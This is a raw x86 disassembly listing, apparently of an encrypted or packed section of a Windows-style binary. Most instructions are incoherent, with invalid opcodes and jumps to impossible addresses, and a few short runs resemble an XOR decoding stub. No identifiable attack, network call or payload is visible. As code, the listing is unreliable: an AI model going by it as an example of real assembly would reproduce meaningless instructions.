  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	mov    dh,0x5e
  40f42b:	fndisi(8087 only) 
  40f42d:	scas   eax,DWORD PTR es:[edi]
  40f42e:	stos   DWORD PTR es:[edi],eax
  40f42f:	jle    0x40f4af
  40f431:	lods   al,BYTE PTR ds:[esi]
  40f432:	jl     0x40f4b2
  40f434:	jle    0x40f438
  40f436:	jecxz  0x40f476
  40f438:	jmp    0x40f3c8
  40f43a:	or     eax,0x32c131cb
  40f43f:	sub    esp,DWORD PTR [ecx-0x629053a1]
  40f445:	stc    
  40f446:	cwde   
  40f447:	ja     0x40f43c
  40f449:	dec    esi
  40f44a:	icebp  
  40f44b:	scas   al,BYTE PTR es:[edi]
  40f44c:	retf   0x1c28
  40f44f:	xchg   DWORD PTR [eax+ecx*1],eax
  40f452:	xchg   esi,eax
  40f453:	outs   dx,BYTE PTR es:[esi]
  40f455:	clc    
  40f456:	add    edx,DWORD PTR [esi+ebx*4+0x7d]
  40f45a:	jle    0x40f433
  40f45c:	jmp    0x653fdab5
  40f461:	sub    edi,edi
  40f463:	leave  
  40f464:	mov    al,0x7d
  40f466:	sub    ch,BYTE PTR [edi+ebx*1+0x5066a9c]
  40f46d:	fsub   DWORD PTR [ecx]
  40f46f:	jb     0x40f4b2
  40f471:	mov    ds:0xedcba397,al
  40f476:	imul   eax,DWORD PTR [edx],0xb7cbd417
  40f47c:	aas    
  40f47d:	inc    edi
  40f47e:	(bad)  
  40f47f:	cli    
  40f480:	and    ecx,ebp
  40f482:	xchg   ebx,eax
  40f483:	aaa    
  40f484:	cli    
  40f485:	xor    DWORD PTR [eax],ebx
  40f487:	aad    0x4f
  40f489:	inc    esi
  40f48a:	and    ch,0x61
  40f48d:	arpl   WORD PTR [edi-0x6],di
  40f490:	retf   0x2aa5
  40f493:	dec    edi
  40f494:	sbb    bl,ah
  40f496:	das    
  40f497:	nop
  40f498:	pop    sp
  40f49a:	ret    0xef30
  40f49d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f49e:	stos   DWORD PTR es:[edi],eax
  40f49f:	jp     0x40f4bc
  40f4a1:	test   al,0xde
  40f4a3:	and    al,0xd8
  40f4a5:	pusha  
  40f4a6:	and    edi,0x8a299113
  40f4ac:	fs cmp ebp,ebx
  40f4af:	outs   dx,DWORD PTR ds:[esi]
  40f4b0:	or     al,0x5f
  40f4b2:	ss cwde 
  40f4b4:	aam    0x58
  40f4b6:	push   es
  40f4b7:	push   ecx
  40f4b8:	sub    eax,0xd045c28f
  40f4bd:	sub    BYTE PTR [eax+0x475d6215],bh
  40f4c3:	stos   BYTE PTR es:[edi],al
  40f4c4:	jmp    0x33acc492
  40f4c9:	inc    esi
  40f4ca:	stc    
  40f4cb:	pop    es
  40f4cc:	lods   eax,DWORD PTR ds:[esi]
  40f4cd:	outs   dx,BYTE PTR ds:[esi]
  40f4ce:	(bad)  
  40f4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4d0:	mov    cl,0xa9
  40f4d2:	or     cl,BYTE PTR [edi]
  40f4d4:	je     0x40f4f6
  40f4d6:	cmc    
  40f4d7:	mov    ds:0xfa34495f,al
  40f4dc:	mov    dh,bh
  40f4de:	mov    cl,0xdf
  40f4e0:	cmp    DWORD PTR [edx+0x1af13a40],ebx
  40f4e6:	adc    BYTE PTR ds:0xbebbba4f,bl
  40f4ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4ed:	inc    edi
  40f4ee:	test   al,0x3e
  40f4f0:	push   edi
  40f4f1:	addr16 pop ss
  40f4f3:	jge    0x40f547
  40f4f5:	loop   0x40f49f
  40f4f7:	add    bl,0xec
  40f4fa:	xor    BYTE PTR [ebp+0x70],bl
  40f4fd:	test   DWORD PTR [edx],eax
  40f4ff:	(bad)  
  40f500:	jmp    0x40f53a
  40f502:	mov    dh,0xfb
  40f504:	xor    bh,BYTE PTR [ecx+0x1828fad7]
  40f50a:	push   ds
  40f50b:	pop    esp
  40f50c:	scas   al,BYTE PTR es:[edi]
  40f50d:	adc    ecx,esp
  40f50f:	mov    ebp,0xf2a33774
  40f514:	jae    0x40f498
  40f516:	mov    DWORD PTR [edx-0x33],esp
  40f519:	sar    BYTE PTR [ebx-0x7e],0x9c
  40f51d:	ret    0x41aa
  40f520:	shl    ebx,0x9e
  40f523:	outs   dx,BYTE PTR ds:[esi]
  40f524:	sub    BYTE PTR [ecx+0x2709c951],ah
  40f52a:	scas   eax,DWORD PTR es:[edi]
  40f52b:	ret    0x597c
  40f52e:	cmp    edx,edi
  40f530:	cld    
  40f531:	sbb    eax,0x7c18109e
  40f536:	ins    BYTE PTR es:[edi],dx
  40f537:	mov    ebp,DWORD PTR [edi]
  40f539:	adc    BYTE PTR [ebx-0x7a],dh
  40f53c:	xchg   esp,eax
  40f53d:	imul   eax,DWORD PTR [eax-0x48],0xffffffa0
  40f541:	push   0xffffffcd
  40f543:	jecxz  0x40f4f2
  40f545:	rcr    BYTE PTR [edi],1
  40f547:	cdq    
  40f548:	aad    0x4e
  40f54a:	inc    edx
  40f54b:	add    BYTE PTR [ebx+0x16],dl
  40f54e:	dec    ebp
  40f54f:	push   edi
  40f550:	jp     0x40f52e
  40f552:	mov    ebp,0x9f8fdef3
  40f557:	mov    edx,0x296296ec
  40f55c:	push   edx
  40f55d:	out    dx,al
  40f55e:	pusha  
  40f55f:	pop    esp
  40f560:	enter  0x8b62,0x1c
  40f564:	cmc    
  40f565:	pop    es
  40f566:	retf   
  40f567:	jns    0x40f5d9
  40f569:	push   ebp
  40f56a:	scas   eax,DWORD PTR es:[edi]
  40f56b:	mov    dh,0x95
  40f56d:	jno    0x40f583
  40f56f:	pop    ss
  40f570:	mov    edx,DWORD PTR [ecx+0x35]
  40f573:	cmp    dh,BYTE PTR [eax+0x75]
  40f576:	push   ebx
  40f577:	out    0xe4,eax
  40f579:	adc    BYTE PTR [ebx-0x48f3b86b],al
  40f57f:	(bad)  
  40f580:	loopne 0x40f5c0
  40f582:	sbb    bl,al
  40f584:	scas   al,BYTE PTR es:[edi]
  40f585:	pushf  
  40f586:	push   eax
  40f587:	xchg   edi,eax
  40f588:	retf   
  40f589:	out    0xd0,eax
  40f58b:	lahf   
  40f58c:	retf   0x7ee8
  40f58f:	pop    ebx
  40f590:	scas   eax,DWORD PTR es:[edi]
  40f591:	pop    ecx
  40f592:	out    0x2c,eax
  40f594:	fcom   DWORD PTR [ebx]
  40f596:	daa    
  40f597:	push   ebp
  40f598:	int3   
  40f599:	jge    0x40f58b
  40f59b:	and    edx,DWORD PTR ds:0xbd979a4e
  40f5a1:	dec    esi
  40f5a2:	cs mov ebp,0xb017abc6
  40f5a8:	fiadd  WORD PTR [eax]
  40f5aa:	dec    esp
  40f5ab:	gs cld 
  40f5ad:	add    BYTE PTR [ebx],ah
  40f5af:	push   ecx
  40f5b0:	loope  0x40f5c4
  40f5b2:	scas   eax,DWORD PTR es:[edi]
  40f5b3:	shr    DWORD PTR [esi],0xe2
  40f5b6:	push   ebx
  40f5b7:	(bad)  
  40f5b9:	ins    DWORD PTR es:[edi],dx
  40f5ba:	fdivr  st,st(6)
  40f5bc:	cmp    edx,esi
  40f5be:	mov    WORD PTR [edi-0x69],fs
  40f5c1:	adc    BYTE PTR [ecx],bl
  40f5c3:	(bad)  
  40f5c5:	in     al,0xa3
  40f5c7:	ins    DWORD PTR es:[edi],dx
  40f5c8:	stos   BYTE PTR es:[edi],al
  40f5c9:	aas    
  40f5ca:	dec    edi
  40f5cb:	cmp    BYTE PTR [edx+0x22752576],0x1d
  40f5d2:	shl    BYTE PTR [edi],1
  40f5d4:	out    0xff,eax
  40f5d6:	push   cs
  40f5d7:	hlt    
  40f5d8:	or     eax,0x18e258c6
  40f5dd:	ret    0x4683
  40f5e0:	pusha  
  40f5e1:	cmp    bl,BYTE PTR [ecx]
  40f5e3:	dec    ecx
  40f5e4:	push   edx
  40f5e5:	xchg   ch,ch
  40f5e7:	rol    edi,1
  40f5e9:	jno    0x40f587
  40f5eb:	dec    esi
  40f5ec:	daa    
  40f5ed:	imul   ebx,DWORD PTR [ebp+0x7512598a],0x3
  40f5f4:	sub    esi,DWORD PTR [edi-0x5d]
  40f5f7:	xchg   ecx,eax
  40f5f8:	add    al,0x15
  40f5fa:	sub    eax,0x7f9d2b46
  40f5ff:	pop    esp
  40f600:	lea    eax,ds:0xc97461fd
  40f606:	xor    edx,DWORD PTR [ebp-0x69887e66]
  40f60c:	mov    ecx,0x60d27976
  40f611:	jae    0x40f644
  40f613:	jmp    0x40f5f6
  40f615:	sub    eax,0xbb695912
  40f61a:	xchg   esi,eax
  40f61b:	in     al,0x59
  40f61d:	stc    
  40f61e:	fdivp  st(7),st
  40f620:	lahf   
  40f621:	add    bl,BYTE PTR [esi]
  40f623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f624:	dec    esp
  40f625:	ret    0x7b95
  40f628:	sub    BYTE PTR [ebp-0xa],0x79
  40f62c:	dec    ebx
  40f62d:	scas   eax,DWORD PTR es:[edi]
  40f62e:	call   0xec64:0x250466f9
  40f635:	aam    0x84
  40f637:	fild   QWORD PTR [edx+esi*8+0x25]
  40f63b:	inc    ebp
  40f63c:	enter  0x885,0xba
  40f640:	add    bh,0xab
  40f643:	jl     0x40f6a9
  40f645:	lahf   
  40f646:	pop    edi
  40f647:	jb     0x40f5ca
  40f649:	call   0xc5cbe8d9
  40f64e:	and    al,0x19
  40f650:	mov    eax,ds:0x89fe224e
  40f655:	cmp    esp,DWORD PTR ds:0xdd4b2d65
  40f65b:	aaa    
  40f65c:	sub    al,0xa3
  40f65e:	sti    
  40f65f:	sub    bl,BYTE PTR [bx+si]
  40f662:	adc    eax,0xc441eb29
  40f667:	mov    dh,dl
  40f669:	mov    ecx,0x4fad66f6
  40f66e:	xchg   ebx,eax
  40f66f:	fisubr WORD PTR [ecx]
  40f671:	push   0x7095614
  40f676:	sbb    cl,ah
  40f678:	and    cl,ch
  40f67a:	push   ss
  40f67b:	ins    BYTE PTR es:[edi],dx
  40f67c:	jmp    0x40f6c1
  40f67e:	lds    ebx,FWORD PTR [esi+0x66]
  40f681:	out    0x72,eax
  40f683:	jl     0x40f606
  40f685:	nop
  40f686:	cmp    ebp,DWORD PTR [eax+0x5617f65e]
  40f68c:	les    ebp,FWORD PTR [edx]
  40f68e:	push   ebp
  40f68f:	mov    ebp,0xb593bd9d
  40f694:	rol    BYTE PTR [ebx+0x230518e2],cl
  40f69a:	lahf   
  40f69b:	adc    eax,0xc4cbec32
  40f6a0:	icebp  
  40f6a1:	shl    edi,0x28
  40f6a4:	jae    0x40f67e
  40f6a6:	adc    BYTE PTR [ebx-0x6b17032c],bl
  40f6ac:	jbe    0x40f65f
  40f6ae:	fidiv  DWORD PTR [ebx+eax*1+0x1a]
  40f6b2:	(bad)  
  40f6b3:	mov    esi,0xb68f1436
  40f6b8:	sbb    eax,0x7005e606
  40f6bd:	jns    0x40f702
  40f6bf:	fstp   DWORD PTR [ebx+0x66]
  40f6c2:	mov    cl,0x39
  40f6c4:	or     DWORD PTR [edi-0x4e],edi
  40f6c7:	push   esp
  40f6c8:	test   BYTE PTR [esi],ah
  40f6ca:	mov    edx,0xc8083cdf
  40f6cf:	cmp    al,BYTE PTR [edi]
  40f6d1:	imul   edi,DWORD PTR [ebx-0x7d],0x867a1913
  40f6d8:	pop    eax
  40f6d9:	sbb    DWORD PTR [ebp-0x5f87f51f],edi
  40f6df:	scas   eax,DWORD PTR es:[edi]
  40f6e0:	ror    BYTE PTR [esi-0x689b1b7d],cl
  40f6e6:	or     al,0xc7
  40f6e8:	inc    ebp
  40f6e9:	cld    
  40f6ea:	xor    al,BYTE PTR [ebp+0x2d81f89c]
  40f6f0:	daa    
  40f6f1:	cmp    BYTE PTR [ebx+0x0],al
  40f6f4:	jb     0x40f752
  40f6f6:	add    BYTE PTR [eax],al
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4337e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	dec    esp
  40f717:	push   esi
  40f718:	push   edx
  40f719:	neg    ch
  40f71b:	mov    dh,0x7e
  40f71d:	jle    0x40f6cb
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f6ef
  40f723:	pop    edi
  40f724:	sub    BYTE PTR [ecx+ebp*8],dl
  40f727:	sti    
  40f728:	jmp    0x400f:0x18ecd5b4
  40f72f:	out    dx,al
  40f730:	sub    eax,0xc86ab109
  40f735:	push   cs
  40f736:	xor    ebx,DWORD PTR [esi-0x7f]
  40f739:	and    eax,esp
  40f73b:	(bad)  [eax-0x61]
  40f73e:	mov    ecx,DWORD PTR [ebx+esi*4-0x20]
  40f742:	adc    eax,0x6233d8ec
  40f747:	mov    ds,WORD PTR [eax+0x3b771565]
  40f74d:	gs or  al,0x83
  40f750:	mov    eax,0x2817999
  40f755:	mov    eax,ds:0x6321efd7
  40f75a:	push   ds
  40f75b:	jecxz  0x40f73a
  40f75d:	fsubr  QWORD PTR [edx+edi*1-0x75ef41c1]
  40f764:	mov    esi,0xa701d72b
  40f769:	lock je 0x40f734
  40f76c:	popf   
  40f76d:	data16 xor al,0x32
  40f770:	xor    al,0xf0
  40f772:	imul   edx,DWORD PTR [edi],0xffffffef
  40f775:	cmc    
  40f776:	loope  0x40f783
  40f778:	pop    eax
  40f779:	aaa    
  40f77a:	jbe    0x40f73f
  40f77c:	mov    ebp,0x50fee18d
  40f781:	sbb    BYTE PTR [ebx],0xec
  40f784:	mov    al,0xb5
  40f786:	xor    esi,eax
  40f788:	or     ebx,DWORD PTR [ebx+0x8]
  40f78b:	jp     0x40f75e
  40f78d:	(bad)  
  40f78e:	je     0x40f7c0
  40f790:	mov    al,0x0
  40f792:	ds clc 
  40f794:	mov    dl,0x58
  40f796:	push   edi
  40f797:	je     0x40f750
  40f799:	loopne 0x40f727
  40f79b:	add    al,0xd2
  40f79d:	adc    bh,BYTE PTR [edx]
  40f79f:	inc    edx
  40f7a0:	or     eax,0x36607523
  40f7a5:	and    al,0xf2
  40f7a7:	imul   ebp,DWORD PTR gs:[esi+0x34d304b1],0xffffffe3
  40f7af:	add    edx,DWORD PTR [ecx+0x61]
  40f7b2:	mov    eax,ds:0x5e46512e
  40f7b7:	inc    ecx
  40f7b8:	ja     0x40f74a
  40f7ba:	pop    edi
  40f7bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7bc:	das    
  40f7bd:	push   cs
  40f7be:	mov    dl,0x74
  40f7c0:	mov    ecx,0x64e185d7
  40f7c5:	and    DWORD PTR [eax],0xc7c1b72f
  40f7cb:	cmovns eax,ebp
  40f7ce:	push   esp
  40f7cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7d0:	push   ds
  40f7d1:	add    DWORD PTR [ecx+0x34],esp
  40f7d4:	lods   eax,DWORD PTR ds:[esi]
  40f7d5:	mov    ds:0x26b99563,eax
  40f7da:	ja     0x40f76a
  40f7dc:	mov    BYTE PTR [eax],ch
  40f7de:	xlat   BYTE PTR ds:[ebx]
  40f7df:	push   ecx
  40f7e0:	mov    bl,0x81
  40f7e2:	or     eax,0x9f7f6c04
  40f7e7:	or     BYTE PTR [edi-0x4ef49fbe],dh
  40f7ed:	mov    eax,ds:0x2bb185a6
  40f7f2:	int    0x32
  40f7f4:	es jecxz 0x40f814
  40f7f7:	mov    ecx,esi
  40f7f9:	inc    edi
  40f7fa:	jae    0x40f802
  40f7fc:	or     DWORD PTR [ebx-0x70],0x3f
  40f800:	sub    BYTE PTR [eax],bh
  40f802:	pop    edi
  40f803:	imul   ebp,DWORD PTR [ebx],0x7eccd8c1
  40f809:	ds add BYTE PTR ds:[esi],dl
  40f80d:	adc    ebx,DWORD PTR [ecx+0x47]
  40f810:	aam    0x80
  40f812:	lods   al,BYTE PTR ds:[esi]
  40f813:	mov    al,ds:0x9188a685
  40f818:	pop    eax
  40f819:	push   edi
  40f81a:	out    dx,eax
  40f81b:	sar    esp,cl
  40f81d:	aaa    
  40f81e:	test   DWORD PTR [ebp-0x5b],edi
  40f821:	test   DWORD PTR ds:0xe733ba1c,esp
  40f827:	push   0x5
  40f829:	jb     0x40f7b6
  40f82b:	push   ss
  40f82c:	cmp    edi,DWORD PTR [ebp+eiz*4+0x28]
  40f830:	repz xor DWORD PTR [ebx+0x7e],0xffffff83
  40f835:	sub    DWORD PTR gs:[esi+eiz*1],0x8a9d54de
  40f83d:	push   eax
  40f83e:	ficomp DWORD PTR [edi+edx*1+0x3c]
  40f842:	pop    eax
  40f843:	aam    0xe0
  40f845:	rcl    DWORD PTR [eax],1
  40f847:	mov    eax,ds:0x90d87dcc
  40f84c:	dec    ebp
  40f84d:	sti    
  40f84e:	mov    dh,0x2c
  40f850:	dec    ebx
  40f851:	ins    DWORD PTR es:[edi],dx
  40f852:	out    dx,al
  40f853:	jl     0x40f880
  40f855:	popa   
  40f856:	rol    BYTE PTR [edi+0x63de5f2d],1
  40f85c:	ins    DWORD PTR es:[edi],dx
  40f85d:	and    DWORD PTR [edx],esp
  40f85f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f860:	icebp  
  40f861:	add    al,0x0
  40f863:	jmp    0xca9c:0xe7c8ce76
  40f86a:	add    bl,ch
  40f86c:	dec    esi
  40f86d:	cmp    DWORD PTR [eax-0xa],ebx
  40f870:	push   esi
  40f871:	ins    DWORD PTR es:[edi],dx
  40f872:	pop    ecx
  40f873:	fbld   TBYTE PTR ds:[edi-0x7d3187a]
  40f87a:	pop    es
  40f87b:	and    BYTE PTR [ebx-0x62fc553d],ah
  40f881:	dec    edi
  40f882:	das    
  40f883:	xchg   BYTE PTR [esp+edi*1-0x1d],dh
  40f887:	push   eax
  40f888:	sbb    eax,0xfb53a353
  40f88d:	jne    0x40f8d4
  40f88f:	xchg   ebp,eax
  40f890:	inc    eax
  40f891:	jmp    0xb8337fec
  40f896:	outs   dx,BYTE PTR ds:[esi]
  40f897:	jns    0x40f828
  40f899:	mov    eax,0x9889725e
  40f89e:	xor    ecx,DWORD PTR [edx+0x7b]
  40f8a1:	mov    al,ds:0xb8d2e0b8
  40f8a6:	sub    al,0xf
  40f8a8:	mov    ch,0x68
  40f8aa:	sub    edi,DWORD PTR [ebx]
  40f8ac:	int3   
  40f8ad:	hlt    
  40f8ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8af:	pop    esi
  40f8b0:	retf   
  40f8b1:	or     ecx,edi
  40f8b3:	das    
  40f8b4:	or     ebp,esp
  40f8b6:	test   eax,0x373f5dbe
  40f8bb:	int3   
  40f8bc:	add    eax,DWORD PTR [esi+0x6e]
  40f8bf:	stos   BYTE PTR es:[edi],al
  40f8c0:	jle    0x40f916
  40f8c2:	int3   
  40f8c3:	out    0xbc,eax
  40f8c5:	addr16 push ds
  40f8c7:	popa   
  40f8c8:	jmp    0x8e56a55f
  40f8cd:	fwait
  40f8ce:	cmp    eax,0x8847e3e8
  40f8d3:	dec    eax
  40f8d4:	and    cl,ah
  40f8d6:	xchg   ecx,eax
  40f8d7:	inc    ecx
  40f8d8:	inc    ecx
  40f8d9:	or     DWORD PTR [edx-0x80],eax
  40f8dc:	or     ecx,DWORD PTR [ebx]
  40f8de:	cmp    BYTE PTR [esi+edi*8-0x26],bl
  40f8e2:	and    ebp,esi
  40f8e4:	lods   eax,DWORD PTR ds:[esi]
  40f8e5:	daa    
  40f8e6:	inc    esp
  40f8e7:	iret   
  40f8e8:	mov    ebp,0x9eb086ce
  40f8ed:	leave  
  40f8ee:	xchg   esp,eax
  40f8ef:	clc    
  40f8f0:	mov    al,0x46
  40f8f2:	jmp    0x40f966
  40f8f4:	xchg   ecx,eax
  40f8f5:	xlat   BYTE PTR ds:[ebx]
  40f8f6:	or     DWORD PTR [ebp+0x4fb0df5a],esp
  40f8fc:	mov    BYTE PTR [ebx+0x4e],0x42
  40f900:	nop
  40f901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f902:	stos   DWORD PTR es:[edi],eax
  40f903:	loop   0x40f8ab
  40f905:	test   al,0xe8
  40f907:	mov    dh,0x5a
  40f909:	xchg   ecx,eax
  40f90a:	in     al,0xbe
  40f90c:	cdq    
  40f90d:	cmp    ebp,DWORD PTR [ecx]
  40f90f:	jg     0x40f93c
  40f911:	outs   dx,DWORD PTR ds:[esi]
  40f912:	sub    esi,DWORD PTR [esi]
  40f914:	ins    BYTE PTR es:[edi],dx
  40f915:	jns    0x40f928
  40f917:	daa    
  40f918:	retf   
  40f919:	mov    dl,bl
  40f91b:	daa    
  40f91c:	cmp    edx,ebp
  40f91e:	iret   
  40f91f:	push   ebp
  40f920:	xor    ebp,eax
  40f922:	jo     0x40f923
  40f924:	mov    ds:0x95d25204,al
  40f929:	sub    bl,BYTE PTR [ecx+0x4be5accc]
  40f92f:	sub    eax,DWORD PTR [esi+0x46]
  40f932:	add    eax,0xab4008b1
  40f937:	jmp    0x40f965
  40f939:	jl     0x40f909
  40f93b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f93c:	popf   
  40f93d:	push   0x98f13e69
  40f942:	push   0x3f
  40f944:	cmp    ch,BYTE PTR [ebx+0x6c393c00]
  40f94a:	int    0x99
  40f94c:	scas   al,BYTE PTR es:[edi]
  40f94d:	dec    ebp
  40f94e:	add    edx,DWORD PTR [eax-0x43]
  40f951:	(bad)  
  40f952:	xchg   ebx,eax
  40f953:	ficomp WORD PTR [edi+edx*2-0x3a273ba]
  40f95a:	jecxz  0x40f8e7
  40f95c:	sbb    DWORD PTR [esi-0x47],esp
  40f95f:	jp     0x40f9c4
  40f961:	dec    ebp
  40f962:	mov    dh,dl
  40f964:	cdq    
  40f965:	xchg   edx,eax
  40f966:	inc    ebp
  40f967:	or     DWORD PTR [esi-0x5b7ae360],edx
  40f96d:	in     eax,dx
  40f96e:	and    BYTE PTR [ebx+0x558ebcb7],0xa5
  40f975:	sbb    eax,0xcb406ac3
  40f97a:	dec    eax
  40f97b:	addr16 mov ebp,0x7171811
  40f981:	pop    ebx
  40f982:	mov    dl,0x68
  40f984:	push   cs
  40f985:	mov    BYTE PTR ds:0xd070011c,al
  40f98b:	fsubr  st,st(3)
  40f98d:	sub    al,0xf1
  40f98f:	xchg   DWORD PTR ds:0xcb21a5ef,eax
  40f995:	xchg   ebx,eax
  40f996:	ja     0x40f9db
  40f998:	mov    edi,0x7e93341a
  40f99d:	sub    ebx,ebp
  40f99f:	bound  ecx,QWORD PTR [edi]
  40f9a1:	(bad)
  40f9a4:	push   0xffffffc8
  40f9a6:	out    0xf2,al
  40f9a8:	(bad)  
  40f9a9:	pop    ds
  40f9aa:	xor    eax,0x6eb989ca
  40f9af:	adc    al,0xfa
  40f9b1:	lahf   
  40f9b2:	lea    esi,[edx]
  40f9b4:	add    dl,dl
  40f9b6:	enter  0xd6bd,0xc5
  40f9ba:	or     ebx,DWORD PTR [ecx-0x4477d02b]
  40f9c0:	outs   dx,BYTE PTR ds:[esi]
  40f9c1:	jbe    0x40f949
  40f9c3:	cmp    BYTE PTR [ebp+0x1ff34d43],al
  40f9c9:	dec    ebx
  40f9ca:	push   eax
  40f9cb:	iret   
  40f9cc:	out    0x47,eax
  40f9ce:	inc    ebx
  40f9cf:	inc    esp
  40f9d0:	int3   
  40f9d1:	inc    ebx
  40f9d2:	mov    BYTE PTR [esi+edx*2],cl
  40f9d5:	adc    esi,DWORD PTR ds:0x433777
  40f9db:	mov    esi,DWORD PTR [ebp-0x8]
  40f9de:	movzx  ecx,BYTE PTR ds:0x43377b
  40f9e5:	adc    DWORD PTR ds:0x433833,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	add    eax,0xbea1d5a
  40fa15:	mov    ch,0x7e
  40fa17:	jle    0x40f9c5
  40fa19:	jl     0x40fa99
  40fa1b:	jle    0x40fa3a
  40fa1d:	cmp    al,0x39
  40fa1f:	jg     0x40fa06
  40fa21:	das    
  40fa22:	popa   
  40fa23:	mov    edx,0xa57d736b
  40fa28:	(bad)  
  40fa29:	lds    esp,FWORD PTR [ecx+0x6a6200bb]
  40fa2f:	or     al,0x8e
  40fa31:	out    0xf0,al
  40fa33:	mov    ah,0x59
  40fa35:	add    DWORD PTR [ecx+0x21],0x9a75275f
  40fa3c:	pop    esp
  40fa3d:	test   eax,0x4b0e0ecb
  40fa42:	push   esp
  40fa43:	fwait
  40fa44:	add    dh,BYTE PTR [ebx]
  40fa46:	jecxz  0x40fa9a
  40fa48:	stos   DWORD PTR es:[edi],eax
  40fa49:	cli    
  40fa4a:	pop    esp
  40fa4b:	inc    eax
  40fa4c:	in     eax,0xee
  40fa4e:	in     al,0xd1
  40fa50:	or     al,0xeb
  40fa52:	daa    
  40fa53:	inc    ecx
  40fa54:	sbb    edi,DWORD PTR [ebx+eiz*8]
  40fa57:	fincstp 
  40fa59:	lods   al,BYTE PTR es:[esi]
  40fa5b:	sub    al,0x9d
  40fa5d:	hlt    
  40fa5e:	mov    ecx,cs
  40fa60:	ins    BYTE PTR es:[edi],dx
  40fa61:	mov    ?,ebx
  40fa63:	fistp  QWORD PTR [esi+ecx*1-0x73]
  40fa67:	cmc    
  40fa68:	add    eax,0xbbad99ed
  40fa6d:	and    eax,0x49cfc728
  40fa72:	(bad)
  40fa76:	cmp    ch,BYTE PTR [ecx]
  40fa78:	idiv   BYTE PTR [esi+0x678f4444]
  40fa7e:	mov    dl,0xbc
  40fa80:	fldln2 
  40fa82:	cmp    BYTE PTR [ecx-0x12],bl
  40fa85:	nop
  40fa86:	mov    esi,0x7fef211c
  40fa8b:	int3   
  40fa8c:	(bad)  
  40fa8d:	lock push esi
  40fa8f:	jbe    0x40fa26
  40fa91:	xchg   BYTE PTR [esi],ch
  40fa93:	sahf   
  40fa94:	pop    edi
  40fa95:	jno    0x40fa6f
  40fa97:	adc    esi,DWORD PTR [eax]
  40fa99:	(bad)  [edi+ebx*4]
  40fa9c:	in     al,dx
  40fa9d:	dec    ecx
  40fa9e:	add    eax,0xf92c9c9
  40faa3:	fisttp WORD PTR [ebx-0x43bff5b]
  40faa9:	xchg   edx,eax
  40faaa:	aad    0x16
  40faac:	loop   0x40fa79
  40faae:	mov    eax,0x53959db4
  40fab3:	pop    ecx
  40fab4:	call   0x5de3:0x162d8452
  40fabb:	jmp    0x88d03112
  40fac0:	mov    WORD PTR [edi-0x6116193e],gs
  40fac6:	mov    BYTE PTR gs:[ecx+edx*2+0x71],bl
  40facb:	imul   esp,DWORD PTR [esi+0x15815a36],0xffffff9f
  40fad2:	and    al,0x2b
  40fad4:	ja     0x40fa75
  40fad6:	push   ebx
  40fad7:	pop    esi
  40fad8:	(bad)  
  40fadb:	push   eax
  40fadc:	sbb    DWORD PTR [ebp-0x2b],ebx
  40fadf:	mov    BYTE PTR [eax+0x20],ch
  40fae2:	stc    
  40fae3:	add    BYTE PTR ds:0x7360b06e,0xad
  40faea:	retf   
  40faeb:	sti    
  40faec:	sub    eax,0x33065ced
  40faf1:	aam    0x64
  40faf3:	jle    0x40fb62
  40faf5:	or     eax,0xe737dd79
  40fafa:	inc    esi
  40fafb:	scas   al,BYTE PTR es:[edi]
  40fafc:	dec    esi
  40fafd:	pop    edx
  40fafe:	jbe    0x40fb58
  40fb00:	xor    ch,BYTE PTR [ebx]
  40fb02:	pop    esi
  40fb03:	jp     0x40fa86
  40fb05:	inc    ecx
  40fb06:	push   ebx
  40fb07:	mov    ah,BYTE PTR [ebp+0x60]
  40fb0a:	ret    0xc3b
  40fb0d:	cmp    al,0x7c
  40fb0f:	jg     0x40fb00
  40fb11:	add    al,0x50
  40fb13:	add    BYTE PTR [ebp-0x5b],al
  40fb16:	jne    0x40fb4d
  40fb18:	mov    dl,0x7a
  40fb1a:	dec    ebp
  40fb1b:	push   es
  40fb1c:	mov    dh,0xb8
  40fb1e:	push   esp
  40fb1f:	jne    0x40fb0c
  40fb21:	pushf  
  40fb22:	mov    edx,0x8803ced
  40fb27:	out    0x5a,al
  40fb29:	loopne 0x40fb88
  40fb2b:	ret    
  40fb2c:	or     cl,BYTE PTR [ecx+0x3f2b18ef]
  40fb32:	js     0x40fb15
  40fb34:	test   al,0x93
  40fb36:	xor    cl,BYTE PTR [edi]
  40fb38:	push   ds
  40fb39:	mov    edi,0xc27cdc8f
  40fb3e:	push   cs
  40fb3f:	dec    edx
  40fb40:	loopne 0x40fb9d
  40fb42:	pop    edi
  40fb43:	mov    bh,BYTE PTR [ebp-0x3c456713]
  40fb49:	jmp    0x63617c9d
  40fb4e:	adc    esi,DWORD PTR [edx]
  40fb50:	mov    ebx,0x55d463ce
  40fb55:	mov    eax,DWORD PTR [edi+esi*4-0x6]
  40fb59:	das    
  40fb5a:	cmp    eax,0x1e60c1d0
  40fb5f:	add    DWORD PTR [eax],0xf15b83ae
  40fb65:	sar    esp,cl
  40fb67:	or     eax,0x3d66bd0
  40fb6c:	mov    ah,0x62
  40fb6e:	je     0x40fb0d
  40fb70:	aad    0xa8
